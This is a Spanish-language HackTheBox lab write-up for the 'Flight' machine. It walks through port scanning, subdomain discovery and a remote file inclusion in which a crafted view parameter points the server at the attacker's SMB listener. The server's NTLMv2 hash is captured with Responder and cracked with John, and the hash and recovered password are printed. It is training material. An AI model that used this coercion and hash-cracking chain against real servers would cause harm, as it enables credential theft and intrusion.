@@ -1,0 +1,947 @@
+<p>Buenas a todos, en esta ocasión resolveremos una máquina windows llamada flight lo cual está catalogada como hard en la plataforma de HackTheBox, me costó bastante resolver esta máquina más que nada la escalada de privilegios, disfruten el contendido.</p>
+
+<p><img src="/assets/images/htb-writeup-flight/flight.jpg" alt="" /></p>
+
+<p>Empezamos a escanear para descubrir puertos abiertos en la máquina</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sS</span> <span class="nt">-vvv</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">--min-rate</span> 5000 10.10.11.187 <span class="nt">-oG</span> targeted
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-03-14 23:15 <span class="nt">-03</span>
+Initiating SYN Stealth Scan at 23:15
+Scanning 10.10.11.187 <span class="o">[</span>65535 ports]
+Discovered open port 445/tcp on 10.10.11.187
+Discovered open port 139/tcp on 10.10.11.187
+Discovered open port 80/tcp on 10.10.11.187
+Discovered open port 135/tcp on 10.10.11.187
+Discovered open port 53/tcp on 10.10.11.187
+Discovered open port 9389/tcp on 10.10.11.187
+Discovered open port 5985/tcp on 10.10.11.187
+Discovered open port 593/tcp on 10.10.11.187
+Discovered open port 49673/tcp on 10.10.11.187
+Discovered open port 49674/tcp on 10.10.11.187
+Discovered open port 3269/tcp on 10.10.11.187
+Discovered open port 49667/tcp on 10.10.11.187
+Discovered open port 464/tcp on 10.10.11.187
+Discovered open port 49725/tcp on 10.10.11.187
+Discovered open port 88/tcp on 10.10.11.187
+Discovered open port 3268/tcp on 10.10.11.187
+Discovered open port 49694/tcp on 10.10.11.187
+Discovered open port 389/tcp on 10.10.11.187
+Discovered open port 636/tcp on 10.10.11.187
+Completed SYN Stealth Scan at 23:16, 26.45s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.11.187
+Host is up, received user-set <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2023-03-14 23:15:53 <span class="nt">-03</span> <span class="k">for </span>27s
+Not shown: 65516 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+80/tcp    open  http             syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+5985/tcp  open  wsman            syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+49667/tcp open  unknown          syn-ack ttl 127
+49673/tcp open  unknown          syn-ack ttl 127
+49674/tcp open  unknown          syn-ack ttl 127
+49694/tcp open  unknown          syn-ack ttl 127
+49725/tcp open  unknown          syn-ack ttl 127
+</code></pre></div></div>
+<p>Seguimos con el escaneo de puertos, pero antes no viene mal usar la utilidad extractPorts para copiar y pegar los puertos sin ninguna dificultad</p>
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="err">❯</span> <span class="n">extractPorts</span> <span class="n">target</span>
+<span class="err">───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+       <span class="err">│</span> <span class="no">File</span><span class="p">:</span> <span class="n">extractPorts</span><span class="p">.</span><span class="nf">tmp</span>
+<span class="err">───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+   <span class="mi">1</span>   <span class="err">│</span> 
+   <span class="mi">2</span>   <span class="err">│</span> <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Extracting</span> <span class="n">information</span><span class="o">...</span>
+   <span class="mi">3</span>   <span class="err">│</span> 
+   <span class="mi">4</span>   <span class="err">│</span>     <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">IP</span> <span class="no">Address</span><span class="p">:</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.187</span>
+   <span class="mi">5</span>   <span class="err">│</span>     <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Open</span> <span class="ss">ports: </span><span class="mi">53</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">88</span><span class="p">,</span><span class="mi">135</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">389</span><span class="p">,</span><span class="mi">445</span><span class="p">,</span><span class="mi">464</span><span class="p">,</span><span class="mi">593</span><span class="p">,</span><span class="mi">636</span><span class="p">,</span><span class="mi">3268</span><span class="p">,</span><span class="mi">3269</span><span class="p">,</span><span class="mi">5985</span><span class="p">,</span><span class="mi">9389</span><span class="p">,</span><span class="mi">49667</span><span class="p">,</span><span class="mi">49673</span><span class="p">,</span><span class="mi">49674</span><span class="p">,</span><span class="mi">49694</span><span class="p">,</span><span class="mi">49725</span>
+   <span class="mi">6</span>   <span class="err">│</span> 
+   <span class="mi">7</span>   <span class="err">│</span> <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Ports</span> <span class="n">copied</span> <span class="n">to</span> <span class="n">clipboard</span>
+   <span class="mi">8</span>   <span class="err">│</span> 
+<span class="err">───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+</code></pre></div></div>
+<p>Sigamos con el escaneo de puertos</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49694,49725 10.10.11.187
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Apache httpd 2.4.52 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1m PHP/8.1.1<span class="o">)</span>
+|_http-server-header: Apache/2.4.52 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1m PHP/8.1.1
+|_http-title: g0 Aviation
+| http-methods: 
+|_  Potentially risky methods: TRACE
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2023-03-15 09:21:52Z<span class="o">)</span>
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: flight.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: flight.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc         Microsoft Windows RPC
+49694/tcp open  msrpc         Microsoft Windows RPC
+49725/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: G0<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 6h59m54s
+| smb2-time: 
+|   <span class="nb">date</span>: 2023-03-15T09:22:47
+|_  start_date: N/A
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+</code></pre></div></div>
+<p>Vemos que en el puerto 3269 nos da un dominio, otra forma que encontré para hallar el dominio fue tirando de crackmapexec</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+❯ crackmapexec smb 10.10.11.187
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> First <span class="nb">time </span>use detected
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating home directory structure
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating default workspace
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Initializing RDP protocol database
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Initializing SSH protocol database
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Initializing SMB protocol database
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Initializing LDAP protocol database
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Initializing WINRM protocol database
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Initializing MSSQL protocol database
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Initializing FTP protocol database
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Copying default configuration file
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Generating SSL certificate
+SMB         10.10.11.187    445    G0               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:G0<span class="o">)</span> <span class="o">(</span>domain:flight.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</code></pre></div></div>
+<p>Agregemos el dominio al archivo /etc/hosts</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span> <span class="s1">'10.10.11.187 flight.htb'</span> <span class="o">&gt;&gt;</span> <span class="sr">/etc/</span><span class="n">hosts</span>
+</code></pre></div></div>
+
+<p>Revisemos la web</p>
+
+<p><img src="/assets/images/htb-writeup-flight/pagina.png" alt="" /></p>
+
+<p>Después de enumerar un largo rato en la web no encontré nada interesante, asé que procederé a buscar subdominios con gobuster</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="err">❯</span> <span class="n">gobuster</span> <span class="n">vhost</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">flight</span><span class="p">.</span><span class="nf">htb</span> <span class="o">-</span><span class="n">w</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="no">Discovery</span><span class="o">/</span><span class="no">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mi">5000</span><span class="p">.</span><span class="nf">txt</span> <span class="o">-</span><span class="n">t</span> <span class="mi">200</span>
+<span class="o">===============================================================</span>
+<span class="no">Gobuster</span> <span class="n">v3</span><span class="o">.</span><span class="mi">5</span>
+<span class="n">by</span> <span class="no">OJ</span> <span class="no">Reeves</span> <span class="p">(</span><span class="vi">@TheColonial</span><span class="p">)</span> <span class="o">&amp;</span> <span class="no">Christian</span> <span class="no">Mehlmauer</span> <span class="p">(</span><span class="vi">@firefart</span><span class="p">)</span>
+<span class="o">===============================================================</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Url</span><span class="p">:</span>             <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">flight</span><span class="p">.</span><span class="nf">htb</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Method</span><span class="p">:</span>          <span class="no">GET</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Threads</span><span class="p">:</span>         <span class="mi">200</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Wordlist</span><span class="p">:</span>        <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="no">Discovery</span><span class="o">/</span><span class="no">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mi">5000</span><span class="p">.</span><span class="nf">txt</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">User</span> <span class="no">Agent</span><span class="p">:</span>      <span class="n">gobuster</span><span class="o">/</span><span class="mf">3.5</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Timeout</span><span class="p">:</span>         <span class="mi">10</span><span class="n">s</span>
+<span class="o">===============================================================</span>
+<span class="mi">2023</span><span class="o">/</span><span class="mo">03</span><span class="o">/</span><span class="mi">14</span> <span class="mi">23</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">57</span> <span class="no">Starting</span> <span class="n">gobuster</span> <span class="k">in</span> <span class="no">VHOST</span> <span class="n">enumeration</span> <span class="n">mode</span>
+<span class="o">===============================================================</span>
+<span class="no">Found</span><span class="p">:</span> <span class="n">school</span><span class="p">.</span><span class="nf">flight</span><span class="p">.</span><span class="nf">htb</span> <span class="p">(</span><span class="no">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="no">Size</span><span class="p">:</span> <span class="mi">3996</span><span class="p">]</span>
+</code></pre></div></div>
+<p>Encontramos un subdominio, ahora es tan solo agregarlo al /etc/hosts</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span> <span class="s1">'10.10.11.187 school.flight.htb'</span> <span class="o">&gt;&gt;</span> <span class="sr">/etc/</span><span class="n">hosts</span>
+</code></pre></div></div>
+<p>Vemos que la página es distinta a la de antes</p>
+
+<p><img src="/assets/images/htb-writeup-flight/pagina2.png" alt="" /></p>
+
+<p>A la hora de darle a HOME podemos ver que la url nos muestra algo interesante</p>
+
+<p><img src="/assets/images/htb-writeup-flight/pagina3.png" alt="" /></p>
+
+<p>Estuve un tiempo intentando ver si es vulnerable a los ataques LFI o sea los local file inclusion, pero veo que las consultas de la web me devuelve lo mismo</p>
+
+<p><img src="/assets/images/htb-writeup-flight/pagina4.png" alt="" /></p>
+
+<p>Probemos con los ataques RFI</p>
+
+<p>Nos ponemos en escucha con el responder</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">responder</span> <span class="o">-</span><span class="no">I</span> <span class="n">tun0</span> <span class="o">-</span><span class="n">w</span> <span class="o">-</span><span class="n">d</span>
+                                         <span class="n">__</span>
+  <span class="p">.</span><span class="nf">-</span><span class="o">---</span><span class="p">.</span><span class="nf">-</span><span class="o">----</span><span class="p">.</span><span class="nf">-</span><span class="o">----</span><span class="p">.</span><span class="nf">-</span><span class="o">----</span><span class="p">.</span><span class="nf">-</span><span class="o">----</span><span class="p">.</span><span class="nf">-</span><span class="o">----</span><span class="p">.</span><span class="nf">-</span><span class="o">-|</span>  <span class="o">|</span><span class="p">.</span><span class="nf">-</span><span class="o">----</span><span class="p">.</span><span class="nf">-</span><span class="o">---.</span>
+  <span class="o">|</span>   <span class="n">_</span><span class="o">|</span>  <span class="o">-</span><span class="n">__</span><span class="o">|</span><span class="n">__</span> <span class="o">--|</span>  <span class="n">_</span>  <span class="o">|</span>  <span class="n">_</span>  <span class="o">|</span>     <span class="o">|</span>  <span class="n">_</span>  <span class="o">||</span>  <span class="o">-</span><span class="n">__</span><span class="o">|</span>   <span class="n">_</span><span class="o">|</span>
+  <span class="o">|</span><span class="n">__</span><span class="o">|</span> <span class="o">|</span><span class="n">_____</span><span class="o">|</span><span class="n">_____</span><span class="o">|</span>   <span class="n">__</span><span class="o">|</span><span class="n">_____</span><span class="o">|</span><span class="n">__</span><span class="o">|</span><span class="n">__</span><span class="o">|</span><span class="n">_____</span><span class="o">||</span><span class="n">_____</span><span class="o">|</span><span class="n">__</span><span class="o">|</span>
+                   <span class="o">|</span><span class="n">__</span><span class="o">|</span>
+
+           <span class="no">NBT</span><span class="o">-</span><span class="no">NS</span><span class="p">,</span> <span class="no">LLMNR</span> <span class="o">&amp;</span> <span class="no">MDNS</span> <span class="no">Responder</span> <span class="mf">3.1</span><span class="o">.</span><span class="mf">3.0</span>
+
+  <span class="no">To</span> <span class="n">support</span> <span class="n">this</span> <span class="ss">project:
+  </span><span class="no">Patreon</span> <span class="o">-&gt;</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">www</span><span class="p">.</span><span class="nf">patreon</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span><span class="no">PythonResponder</span>
+  <span class="no">Paypal</span>  <span class="o">-&gt;</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">paypal</span><span class="p">.</span><span class="nf">me</span><span class="o">/</span><span class="no">PythonResponder</span>
+
+  <span class="no">Author</span><span class="p">:</span> <span class="no">Laurent</span> <span class="no">Gaffie</span> <span class="p">(</span><span class="n">laurent</span><span class="p">.</span><span class="nf">gaffie</span><span class="vi">@gmail</span><span class="p">.</span><span class="nf">com</span><span class="p">)</span>
+  <span class="no">To</span> <span class="n">kill</span> <span class="n">this</span> <span class="n">script</span> <span class="n">hit</span> <span class="no">CTRL</span><span class="o">-</span><span class="no">C</span>
+
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Poisoners</span><span class="p">:</span>
+    <span class="no">LLMNR</span>                      <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">NBT</span><span class="o">-</span><span class="no">NS</span>                     <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">MDNS</span>                       <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">DNS</span>                        <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">DHCP</span>                       <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Servers</span><span class="p">:</span>
+    <span class="no">HTTP</span> <span class="n">server</span>                <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">HTTPS</span> <span class="n">server</span>               <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">WPAD</span> <span class="n">proxy</span>                 <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">Auth</span> <span class="n">proxy</span>                 <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+    <span class="no">SMB</span> <span class="n">server</span>                 <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">Kerberos</span> <span class="n">server</span>            <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">SQL</span> <span class="n">server</span>                 <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">FTP</span> <span class="n">server</span>                 <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">IMAP</span> <span class="n">server</span>                <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">POP3</span> <span class="n">server</span>                <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">SMTP</span> <span class="n">server</span>                <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">DNS</span> <span class="n">server</span>                 <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">LDAP</span> <span class="n">server</span>                <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">RDP</span> <span class="n">server</span>                 <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">DCE</span><span class="o">-</span><span class="no">RPC</span> <span class="n">server</span>             <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">WinRM</span> <span class="n">server</span>               <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">HTTP</span> <span class="no">Options</span><span class="p">:</span>
+    <span class="no">Always</span> <span class="n">serving</span> <span class="no">EXE</span>         <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+    <span class="no">Serving</span> <span class="no">EXE</span>                <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+    <span class="no">Serving</span> <span class="no">HTML</span>               <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+    <span class="no">Upstream</span> <span class="no">Proxy</span>             <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Poisoning</span> <span class="no">Options</span><span class="p">:</span>
+    <span class="no">Analyze</span> <span class="no">Mode</span>               <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+    <span class="no">Force</span> <span class="no">WPAD</span> <span class="n">auth</span>            <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+    <span class="no">Force</span> <span class="no">Basic</span> <span class="no">Auth</span>           <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+    <span class="no">Force</span> <span class="no">LM</span> <span class="n">downgrade</span>         <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+    <span class="no">Force</span> <span class="no">ESS</span> <span class="n">downgrade</span>        <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Generic</span> <span class="no">Options</span><span class="p">:</span>
+    <span class="no">Responder</span> <span class="no">NIC</span>              <span class="p">[</span><span class="n">tun0</span><span class="p">]</span>
+    <span class="no">Responder</span> <span class="no">IP</span>               <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">14.105</span><span class="p">]</span>
+    <span class="no">Responder</span> <span class="no">IPv6</span>             <span class="p">[</span><span class="n">dead</span><span class="ss">:beef</span><span class="p">:</span><span class="mi">2</span><span class="o">::</span><span class="mi">1014</span><span class="p">]</span>
+    <span class="no">Challenge</span> <span class="n">set</span>              <span class="p">[</span><span class="n">random</span><span class="p">]</span>
+    <span class="no">Don</span><span class="s1">'t Respond To Names     ['</span><span class="no">ISATAP</span><span class="err">'</span><span class="p">]</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Current</span> <span class="no">Session</span> <span class="no">Variables</span><span class="p">:</span>
+    <span class="no">Responder</span> <span class="no">Machine</span> <span class="no">Name</span>     <span class="p">[</span><span class="no">WIN</span><span class="o">-</span><span class="no">X8CGHZMJ1L7</span><span class="p">]</span>
+    <span class="no">Responder</span> <span class="no">Domain</span> <span class="no">Name</span>      <span class="p">[</span><span class="mi">8</span><span class="no">AD5</span><span class="o">.</span><span class="no">LOCAL</span><span class="p">]</span>
+    <span class="no">Responder</span> <span class="no">DCE</span><span class="o">-</span><span class="no">RPC</span> <span class="no">Port</span>     <span class="p">[</span><span class="mi">47658</span><span class="p">]</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Listening</span> <span class="k">for</span> <span class="n">events</span><span class="o">...</span>
+
+</code></pre></div></div>
+<p>Le lanzamos un curl a la web de la siguiente forma</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span>  <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="s1">'http://school.flight.htb/index.php?view=//10.10.14.105/smb/setensa.txt'</span>
+<span class="o">&lt;!</span><span class="no">DOCTYPE</span> <span class="n">html</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="no">Aviation</span> <span class="no">School</span><span class="o">&lt;</span><span class="sr">/title&gt;
+&lt;meta charset="UTF-8" /</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">link</span> <span class="n">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="n">type</span><span class="o">=</span><span class="s2">"text/css"</span> <span class="n">href</span><span class="o">=</span><span class="s2">"styles/style.css"</span> <span class="o">/&gt;</span>
+<span class="o">&lt;!--</span><span class="p">[</span><span class="k">if</span> <span class="no">IE</span> <span class="mi">6</span><span class="p">]</span><span class="o">&gt;&lt;</span><span class="n">link</span> <span class="n">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="n">type</span><span class="o">=</span><span class="s2">"text/css"</span> <span class="n">href</span><span class="o">=</span><span class="s2">"styles/ie6.css"</span> <span class="o">/&gt;&lt;!</span><span class="p">[</span><span class="n">endif</span><span class="p">]</span><span class="o">--&gt;</span>
+<span class="o">&lt;</span><span class="sr">/head&gt;
+&lt;body&gt;
+&lt;div id="page"&gt;
+  &lt;div id="header"&gt;
+    &lt;div id="section"&gt;
+      &lt;div&gt;&lt;a href="index.html"&gt;&lt;img src="images/</span><span class="n">logo</span><span class="p">.</span><span class="nf">gif</span><span class="s2">" alt="" /&gt;&lt;/a&gt;&lt;/div&gt;
+       &lt;/div&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href="</span><span class="n">index</span><span class="p">.</span><span class="nf">php?</span><span class="n">view</span><span class="o">=</span><span class="n">home</span><span class="p">.</span><span class="nf">html</span><span class="s2">"&gt;Home&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href="</span><span class="n">index</span><span class="p">.</span><span class="nf">php?</span><span class="n">view</span><span class="o">=</span><span class="n">about</span><span class="p">.</span><span class="nf">html</span><span class="s2">"&gt;About Us&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href="</span><span class="n">index</span><span class="p">.</span><span class="nf">php?</span><span class="n">view</span><span class="o">=</span><span class="n">blog</span><span class="p">.</span><span class="nf">html</span><span class="s2">"&gt;Blog&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/div&gt;
+  &lt;div id="</span><span class="n">footer</span><span class="s2">"&gt;
+    &lt;div&gt;
+      &lt;div id="</span><span class="n">connect</span><span class="s2">"&gt; &lt;a href="</span><span class="c1">#"&gt;&lt;img src="images/icon-facebook.gif" alt="" /&gt;&lt;/a&gt; &lt;a href="#"&gt;&lt;img src="images/icon-twitter.gif" alt="" /&gt;&lt;/a&gt; &lt;a href="#"&gt;&lt;img src="images/icon-youtube.gif" alt="" /&gt;&lt;/a&gt; &lt;/div&gt;</span>
+      <span class="o">&lt;</span><span class="n">div</span> <span class="k">class</span><span class="o">=</span><span class="s2">"section"</span><span class="o">&gt;</span>
+        <span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="no">Copyright</span> <span class="o">&amp;</span><span class="n">copy</span><span class="p">;</span> <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s2">"#"</span><span class="o">&gt;</span><span class="no">Domain</span> <span class="no">Name</span><span class="o">&lt;</span><span class="sr">/a&gt; - All Rights Reserved | Template By &lt;a href="#"&gt;Domain Name&lt;/</span><span class="n">a</span><span class="o">&gt;&lt;</span><span class="sr">/p&gt;
+      &lt;/</span><span class="n">div</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="sr">/div&gt;
+  &lt;/</span><span class="n">div</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="sr">/div&gt;
+&lt;/</span><span class="n">body</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="sr">/html&gt;% 
+</span></code></pre></div></div>
+<p>Ahora miramos en el responder y vemos que capturamos un hash NTLMv2,
+al final es vulnerable a los ataques RFI, copiemos el hash y guardémoslo en un archivo para
+crackearlo con John</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>SMB] NTLMv2-SSP Client   : 10.10.11.187
+<span class="o">[</span>SMB] NTLMv2-SSP Username : flight<span class="se">\s</span>vc_apache
+<span class="o">[</span>SMB] NTLMv2-SSP Hash     : svc_apache::flight:690ba1fe456f2723:A876141A0C34E5BED166E1FA0C1D0A5A:010100000000000000330C6CD256D901200B5751A20220540000000002000800380041004400350001001E00570049004E002D00580038004300470048005A004D004A0031004C00370004003400570049004E002D00580038004300470048005A004D004A0031004C0037002E0038004100440035002E004C004F00430041004C000300140038004100440035002E004C004F00430041004C000500140038004100440035002E004C004F00430041004C000700080000330C6CD256D9010600040002000000080030003000000000000000000000000030000055BD617D7D33214E59B58A850B2DDFDF37A55A528650AFED86EC8F736DE5FCB90A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320032000000000000000000
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+❯ john <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+S@Ss!K@<span class="k">*</span>t13      <span class="o">(</span>svc_apache<span class="o">)</span>     
